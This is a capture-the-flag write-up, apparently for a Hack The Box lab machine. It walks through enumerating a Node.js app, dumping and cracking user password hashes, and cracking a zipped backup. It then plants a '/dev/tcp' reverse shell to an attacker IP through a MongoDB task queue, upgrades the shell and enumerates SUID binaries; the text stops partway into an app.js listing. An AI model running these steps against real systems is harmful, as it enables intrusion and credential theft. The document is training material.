\u0026lt;!--\u0026lt;![endif]--\u0026gt; \u0026lt;head\u0026gt; \u0026lt;base href=\u0026#34;/\u0026#34;\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;meta http-equiv=\u0026#34;X-UA-Compatible\u0026#34; content=\u0026#34;IE=edge\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34;\u0026gt; \u0026lt;title\u0026gt;MyPlace\u0026lt;/title\u0026gt; \u0026lt;!-- Bootstrap Core CSS --\u0026gt; \u0026lt;link href=\u0026#34;/vendor/bootstrap/css/bootstrap.min.css\u0026#34; rel=\u0026#34;stylesheet\u0026#34;\u0026gt; \u0026lt;!-- Theme CSS --\u0026gt; \u0026lt;link href=\u0026#34;/assets/css/freelancer.min.css\u0026#34; rel=\u0026#34;stylesheet\u0026#34;\u0026gt; \u0026lt;link href=\u0026#34;/assets/css/app.css\u0026#34; rel=\u0026#34;stylesheet\u0026#34;\u0026gt; \u0026lt;!-- Custom Fonts --\u0026gt; \u0026lt;link href=\u0026#34;/vendor/font-awesome/css/font-awesome.min.css\u0026#34; rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34;\u0026gt; \u0026lt;link href=\u0026#34;https://fonts.googleapis.com/css?family=Montserrat:400,700\u0026#34; rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34;\u0026gt; \u0026lt;link href=\u0026#34;https://fonts.googleapis.com/css?family=Lato:400,700,400italic,700italic\u0026#34; rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body id=\u0026#34;page-top\u0026#34; class=\u0026#34;index\u0026#34;\u0026gt; \u0026lt;!-- Navigation --\u0026gt; \u0026lt;nav id=\u0026#34;mainNav\u0026#34; class=\u0026#34;navbar navbar-default navbar-fixed-top navbar-custom\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;!-- Brand and toggle get grouped for better mobile display --\u0026gt; \u0026lt;div class=\u0026#34;navbar-header page-scroll\u0026#34;\u0026gt; \u0026lt;button type=\u0026#34;button\u0026#34; class=\u0026#34;navbar-toggle\u0026#34; data-toggle=\u0026#34;collapse\u0026#34; data-target=\u0026#34;#bs-example-navbar-collapse-1\u0026#34;\u0026gt; \u0026lt;span class=\u0026#34;sr-only\u0026#34;\u0026gt;Toggle navigation\u0026lt;/span\u0026gt; Menu \u0026lt;i class=\u0026#34;fa fa-bars\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; \u0026lt;/button\u0026gt; \u0026lt;a class=\u0026#34;navbar-brand\u0026#34; href=\u0026#34;/\u0026#34;\u0026gt;MyPlace\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;!-- Collect the nav links, forms, and other content for toggling --\u0026gt; \u0026lt;div class=\u0026#34;collapse navbar-collapse\u0026#34; id=\u0026#34;bs-example-navbar-collapse-1\u0026#34;\u0026gt; \u0026lt;ul class=\u0026#34;nav navbar-nav navbar-right\u0026#34;\u0026gt; \u0026lt;li class=\u0026#34;hidden\u0026#34;\u0026gt; \u0026lt;a href=\u0026#34;/\u0026#34;\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;li class=\u0026#34;page-scroll\u0026#34;\u0026gt; \u0026lt;a href=\u0026#34;/login\u0026#34;\u0026gt;Login\u0026lt;/a\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;!-- /.navbar-collapse --\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;!-- /.container-fluid --\u0026gt; \u0026lt;/nav\u0026gt; \u0026lt;!-- Header --\u0026gt; \u0026lt;header\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;col-lg-12\u0026#34;\u0026gt; \u0026lt;img class=\u0026#34;img-responsive\u0026#34; src=\u0026#34;img/profile.png\u0026#34; alt=\u0026#34;\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;intro-text\u0026#34;\u0026gt; \u0026lt;span class=\u0026#34;name\u0026#34;\u0026gt;Welcome to MyPlace\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/header\u0026gt; \u0026lt;!--[if lt IE 8]\u0026gt; \u0026lt;p class=\u0026#34;browserupgrade\u0026#34;\u0026gt;You are using an \u0026lt;strong\u0026gt;outdated\u0026lt;/strong\u0026gt; browser. Please \u0026lt;a href=\u0026#34;http://browsehappy.com/\u0026#34;\u0026gt;upgrade your browser\u0026lt;/a\u0026gt; to improve your experience.\u0026lt;/p\u0026gt; \u0026lt;![endif]--\u0026gt; \u0026lt;div data-ng-view=\u0026#34;\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;vendor/jquery/jquery.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;vendor/bootstrap/js/bootstrap.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;vendor/angular/angular.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;vendor/angular/angular-route.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;assets/js/app/app.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;assets/js/app/controllers/home.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;assets/js/app/controllers/login.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;assets/js/app/controllers/admin.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;assets/js/app/controllers/profile.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;assets/js/misc/freelancer.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/html\u0026gt; * Connection #0 to host 10.10.10.58 left intact    We can specified the header  1  curl -H \u0026#34;User-Agent: Dirbuster\u0026#34; 10.10.10.58:3000   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38  curl -H \u0026#34;User-Agent: Dirbuster\u0026#34; 10.10.10.58:3000 root@sake QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ QQQQQQQQQQQQQQQQQQQWQQQQQWWWBBBHHHHHHHHHBWWWQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ QQQQQQQQQQQQQQQD!`__ssaaaaaaaaaass_ass_s____. -~\u0026#34;\u0026#34;??9VWQQQQQQQQQQQQQQQQQQQ QQQQQQQQQQQQQP\u0026#39;_wmQQQWWBWV?GwwwmmWQmwwwwwgmZUVVHAqwaaaac,\u0026#34;?9$QQQQQQQQQQQQQQ QQQQQQQQQQQW! aQWQQQQW?qw#TTSgwawwggywawwpY?T?TYTYTXmwwgZ$ma/-?4QQQQQQQQQQQ QQQQQQQQQQW\u0026#39; jQQQQWTqwDYauT9mmwwawww?WWWWQQQQQ@TT?TVTT9HQQQQQQw,-4QQQQQQQQQ QQQQQQQQQQ[ jQQQQQyWVw2$wWWQQQWWQWWWW7WQQQQQQQQPWWQQQWQQw7WQQQWWc)WWQQQQQQQ QQQQQQQQQf jQQQQQWWmWmmQWU???????9WWQmWQQQQQQQWjWQQQQQQQWQmQQQQWL 4QQQQQQQQ QQQQQQQP\u0026#39;.yQQQQQQQQQQQP\u0026#34; \u0026lt;wa,.!4WQQQQQQQWdWP??!\u0026#34;??4WWQQQWQQc ?QWQQQQQ QQQQQP\u0026#39;_a.\u0026lt;aamQQQW!\u0026lt;yF \u0026#34;!` .. \u0026#34;??$Qa \u0026#34;WQQQWTVP\u0026#39; \u0026#34;??\u0026#39; =QQmWWV?46/ ?QQQQQ QQQP\u0026#39;sdyWQP?!`.-\u0026#34;?46mQQQQQQT!mQQgaa. \u0026lt;wWQQWQaa _aawmWWQQQQQQQQQWP4a7g -WWQQ QQ[ j@mQP\u0026#39;adQQP4ga, -????\u0026#34; \u0026lt;jQQQQQWQQQQQQQQQWW;)WQWWWW9QQP?\u0026#34;` -?QzQ7L ]QQQ QW jQkQ@ jWQQD\u0026#39;-?$QQQQQQQQQQQQQQQQQWWQWQQQWQQQc\u0026#34;4QQQQa .QP4QQQQfWkl jQQQ QE ]QkQk $D?` waa \u0026#34;?9WWQQQP??T?47`_aamQQQQQQWWQw,-?QWWQQQQQ`\u0026#34;QQQDQf(.QWQQ QQ,-Qm4Q/-QmQ6 \u0026#34;WWQma/ \u0026#34;??QQQQQQL 4W\u0026#34;- -?$QQQQWP`s,awT$QQQ@ \u0026#34;QW@?$:.yQQQQ QQm/-4wTQgQWQQ, ?4WWk 4waac -???$waQQQQQQQQF??\u0026#39;\u0026lt;mWWWWWQW?^ ` ]6QQ\u0026#39; yQQQQQ QQQQw,-?QmWQQQQw a, ?QWWQQQw _. \u0026#34;????9VWaamQWV???\u0026#34; a j/ ]QQf jQQQQQQ QQQQQQw,\u0026#34;4QQQQQQm,-$Qa???4F jQQQQQwc \u0026lt;aaas _aaaaa 4QW ]E )WQ`=QQQQQQQ QQQQQQWQ/ $QQQQQQQa?H ]Wwa, ???9WWWh dQWWW,=QWWU? ?! )WQ ]QQQQQQQ QQQQQQQQQc-QWQQQQQW6, QWQWQQQk \u0026lt;c jWQ ]QQQQQQQ QQQQQQQQQQ,\u0026#34;$WQQWQQQQg,.\u0026#34;?QQQQ\u0026#39;.mQQQmaa,., . .; QWQ.]QQQQQQQ QQQQQQQQQWQa ?$WQQWQQQQQa,.\u0026#34;?( mQQQQQQW[:QQQQm[ ammF jy! j( } jQQQ(:QQQQQQQ QQQQQQQQQQWWma \u0026#34;9gw?9gdB?QQwa, -??T$WQQ;:QQQWQ ]WWD _Qf +?! _jQQQWf QQQQQQQ QQQQQQQQQQQQQQQws \u0026#34;Tqau?9maZ?WQmaas,, --~-- --- . _ssawmQQQQQQk 3QQQQWQ QQQQQQQQQQQQQQQQWQga,-?9mwad?1wdT9WQQQQQWVVTTYY?YTVWQQQQWWD5mQQPQQQ ]QQQQQQ QQQQQQQWQQQQQQQQQQQWQQwa,-??$QwadV}\u0026lt;wBHHVHWWBHHUWWBVTTTV5awBQQD6QQQ ]QQQQQQ QQQQQQQQQQQQQQQQQQQQQQWWQQga,-\u0026#34;9$WQQmmwwmBUUHTTVWBWQQQQWVT?96aQWQQQ ]QQQQQQ QQQQQQQQQQWQQQQWQQQQQQQQQQQWQQma,-?9$QQWWQQQQQQQWmQmmmmmQWQQQQWQQW(.yQQQQQW QQQQQQQQQQQQQWQQQQQQWQQQQQQQQQQQQQga%,. -??9$QQQQQQQQQQQWQQWQQV? sWQQQQQQQ QQQQQQQQQWQQQQQQQQQQQQQQWQQQQQQQQQQQWQQQQmywaa,;~^\u0026#34;!???????!^`_saQWWQQQQQQQ QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQWWWWQQQQQmwywwwwwwmQQWQQQQQQQQQQQ QQQQQQQWQQQWQQQQQQWQQQWQQQQQWQQQQQQQQQQQQQQQQWQQQQQWQQQWWWQQQQQQQQQQQQQQQWQ \u0026lt;!-- 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 --\u0026gt;#   Exploitation  Inspecting the website we found couple interesting paths  assets/js/app/app.js assets/js/app/controllers/home.js assets/js/app/controllers/login.js assets/js/app/controllers/admin.js assets/js/app/controllers/profile.js assets/js/misc/freelancer.min.js   Let’s check /api/admin/backup found in /admin.js  Nothing really interesting here   /api/users/  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  0\t_id\t\u0026#34;59a7365b98aa325cc03ee51c\u0026#34; username\t\u0026#34;myP14ceAdm1nAcc0uNT\u0026#34; password\t\u0026#34;dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af\u0026#34; is_admin\ttrue 1\t_id\t\u0026#34;59a7368398aa325cc03ee51d\u0026#34; username\t\u0026#34;tom\u0026#34; password\t\u0026#34;f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240\u0026#34; is_admin\tfalse 2\t_id\t\u0026#34;59a7368e98aa325cc03ee51e\u0026#34; username\t\u0026#34;mark\u0026#34; password\t\u0026#34;de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73\u0026#34; is_admin\tfalse 3\t_id\t\u0026#34;59aa9781cced6f1d1490fce9\u0026#34; username\t\u0026#34;rastating\u0026#34; password\t\u0026#34;5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0\u0026#34; is_admin\tfalse    Using an online password cracker → https://crackstation.net/  1 2 3 4 5  dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af # manchester de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73 # snowflake 5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0 # Not found   Logged in with myP14ceAdm1nAcc0uNT | manchester\n Download the backup file Looks like a base64  1 2 3  file myplace.backup -\u0026gt; myplace.backup: ASCII text, with very long lines (65536), with no line terminators    Translate the base64 file  1  cat myplace.backup | base64 -d \u0026gt; myplace   1 2  file myplace -\u0026gt; myplace: Zip archive data, at least v1.0 to extract, compression method=store   1  unzip myplace # requires password   1 2 3 4 5 6  fcrackzip -uDp /usr/share/wordlists/rockyou.txt ./myplace [-u] use unzip to weed out wrong passowrds [-D] use a dictionary [-p] use string as initial password/file PASSWORD FOUND!!!!: pw == magicword    Opening app.js we can find some credentials mark | 5AYRft73VtFpc84k  1  ssh mark@10.10.10.58    The flag is in tom but we need privileges to get access to tom  1  ps aux # see the running processes    There is an interesting path /var/scheduler/app.js  1  nano /var/scheduler/app.js   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  const exec = require(\u0026#39;child_process\u0026#39;).exec; const MongoClient = require(\u0026#39;mongodb\u0026#39;).MongoClient; const ObjectID = require(\u0026#39;mongodb\u0026#39;).ObjectID; const url = \u0026#39;mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT\u0026amp;authSource=scheduler\u0026#39;; MongoClient.connect(url, function(error, db) { if (error || !db) { console.log(\u0026#39;[!] Failed to connect to mongodb\u0026#39;); return; } setInterval(function () { db.collection(\u0026#39;tasks\u0026#39;).find().toArray(function (error, docs) { if (!error \u0026amp;\u0026amp; docs) { docs.forEach(function (doc) { if (doc) { console.log(\u0026#39;Executing task \u0026#39; + doc._id + \u0026#39;...\u0026#39;); exec(doc.cmd); db.collection(\u0026#39;tasks\u0026#39;).deleteOne({ _id: new ObjectID(doc._id) }); } }); } else if (error) { console.log(\u0026#39;Something went wrong: \u0026#39; + error); } }); }, 30000); });    mongo db stores information as collections. We can connect to the scheduler database and insert a new collection in tasks with the command we want and it will execute in (doc.cmd) mark : 5AYRft73VtFpc84k Conencting to the database scheduler. Ref → https://docs.mongodb.com/v4.4/mongo/  1 2 3 4  mongo --username mark --password 5AYRft73VtFpc84k scheduler \u0026gt; show collections tasks    SSH with another terminal and place a reverse shell in /tmp  1 2 3 4 5 6 7 8 9 10  ssh mark@10.10.10.58 cd /tmp nano shell.sh --- bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.18/8080 0\u0026gt;\u0026amp;1 --- nc -lvnp 8080   1 2 3 4 5 6 7 8 9 10 11  db.tasks.find() db.tasks.insertOne({cmd: \u0026#34;bash /tmp/shell.sh\u0026#34;}); --- { \u0026#34;acknowledged\u0026#34; : true, \u0026#34;insertedId\u0026#34; : ObjectId(\u0026#34;622bbe2b5804df2507a28893\u0026#34;) } --- db.tasks.find() # Check if the task is still there if not we already got a shell   Interactive Shell\n1 2 3 4 5 6 7 8 9 10 11  which python python -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; CTRL + Z stty raw -echo fg [enter] export TERM=screen cat /tom/user.txt -\u0026gt; e1156acc3574e04b06908ecf76be91b1   Privilege Escalation  Looking at the myplace /app.js this part will help to escalate privileges  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  find / -perm -u=s 2\u0026gt;/dev/null /usr/lib/eject/dmcrypt-get-device /usr/lib/snapd/snap-confine /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic /usr/lib/openssh/ssh-keysign /usr/lib/policykit-1/polkit-agent-helper-1 /usr/local/bin/backup /usr/bin/chfn /usr/bin/at /usr/bin/gpasswd /usr/bin/newgidmap /usr/bin/chsh /usr/bin/sudo /usr/bin/pkexec /usr/bin/newgrp /usr/bin/passwd /usr/bin/newuidmap /bin/ping /bin/umount /bin/fusermount /bin/ping6 /bin/ntfs-3g /bin/su /bin/mount   1  cd /usr/local/bin   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234  app.js --- const express = require(\u0026#39;express\u0026#39;); const session = require(\u0026#39;express-session\u0026#39;); const bodyParser = require(\u0026#39;body-parser\u0026#39;); const crypto = require(\u0026#39;crypto\u0026#39;); const MongoClient = require(\u0026#39;mongodb\u0026#39;).MongoClient; const ObjectID = require(\u0026#39;mongodb\u0026#39;).ObjectID; const path = require(\u0026#34;path\u0026#34;); const spawn = require(\u0026#39;child_process\u0026#39;).spawn; const app = express(); const url = \u0026#39;mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT\u0026amp;authSource=myplace\u0026#39;; const backup_key = \u0026#39;45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474\u0026#39;; MongoClient.connect(url, function(error, db) { if (error || !db) { console.log(\u0026#39;[!] Failed to connect to mongodb\u0026#39;); return; } app.use(session({ secret: \u0026#39;the boundless tendency initiates the law.\u0026#39;, cookie: { maxAge: 3600000 }, resave: false, saveUninitialized: false })); app.use(function (req, res, next) { var agent = req.headers[\u0026#39;user-agent\u0026#39;]; var blacklist = /(DirBuster)|(Postman)|(Mozilla\\/4\\.0.+Windows NT 5\\.1)|(Go\\-http\\-client)/i; if (!blacklist.test(agent)) { next(); } else { count = Math.floor((Math.random() * 10000) + 1); randomString = \u0026#39;\u0026#39;; var charset = \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\u0026#34;; for (var i = 0; i \u0026lt; count; i++) randomString += charset.charAt(Math.floor(Math.random() * charset.length)); res.set(\u0026#39;Content-Type\u0026#39;, \u0026#39;text/plain\u0026#39;).status(200).send( [ \u0026#39;QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ\u0026#39;, \u0026#39;QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ\u0026#39;, \u0026#39;QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ\u0026#39;, 